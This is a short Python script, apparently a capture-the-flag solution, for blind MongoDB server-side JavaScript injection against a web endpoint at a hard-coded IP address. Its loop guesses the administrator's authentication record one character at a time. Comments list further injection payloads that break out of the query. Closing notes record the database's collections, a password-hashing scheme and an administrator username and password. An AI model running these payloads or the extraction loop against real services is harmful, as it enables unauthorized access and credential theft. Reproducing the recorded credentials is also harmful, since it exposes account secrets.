# -*- coding:utf-8 --
import requests
import string 

# 2});return {username:tojson(db.getCollectionNames())};//
# 2});return {images:db.getCollectionNames()};//
# 2%26%26db.getCollectionNames().length>0%26%261
# 2});return {picture_path:tojson(db.authentication.find()[0])}};%2f%2f


url = "http://206.189.54.119:5000/get/image/"
flag = ""
for i in range(30, 200):
    print i
    for k in string.printable:
        payload = "2%26%26tojson(db.authentication.find()[0])[{}]==%27{}%27%26%261".format(str(i), str(k))
        res = requests.get(url + payload)
        # print res.content
        if "Not Found" not in res.content:
            flag += k
            print "[+]flag: " + flag
            break


# db personal_site
# db.getCollectionNames().length == 6 集合长度6
# authentication, contents, credentials, images, system.indexes, titles
# md5(se3cr3t|[username]|[password])
# administrator H4rdP@ssw0rd?
# 2CC348195DC1AB9842F9446B41EF650B

# db.personal_site.system.indexes.find()